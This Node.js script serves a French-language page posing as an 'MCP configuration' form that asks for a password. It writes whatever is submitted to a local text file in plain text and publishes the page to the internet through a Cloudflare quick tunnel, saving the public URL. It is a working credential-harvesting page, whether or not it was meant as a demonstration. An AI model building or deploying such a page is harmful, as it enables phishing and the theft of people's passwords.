const http = require('http');
const { spawn } = require('child_process');
const { parse } = require('querystring');
const fs = require('fs');

const port = 8891;
const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/submit') {
    let body = '';
    req.on('data', chunk => { body += chunk.toString(); });
    req.on('end', () => {
      const data = parse(body);
      fs.writeFileSync('resultat_final.txt', `VALEUR_RECUE: ${data.password}`);
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end('<h1>✅ RECU !</h1>');
    });
  } else {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`
      <html>
        <body style='font-family:sans-serif; padding:20px;'>
          <h2>🔐 Configuration MCP</h2>
          <form action='/submit' method='POST'>
            <input type='password' name='password' placeholder='Mot de passe' required>
            <button type='submit'>Valider</button>
          </form>
        </body>
      </html>
    `);
  }
});

server.listen(port, '0.0.0.0', () => {
  const tunnel = spawn('cloudflared', ['tunnel', '--url', `http://127.0.0.1:${port}`]);
  tunnel.stderr.on('data', (data) => {
    const match = data.toString().match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
    if (match) fs.writeFileSync('demo_url.txt', match[0]);
  });
});
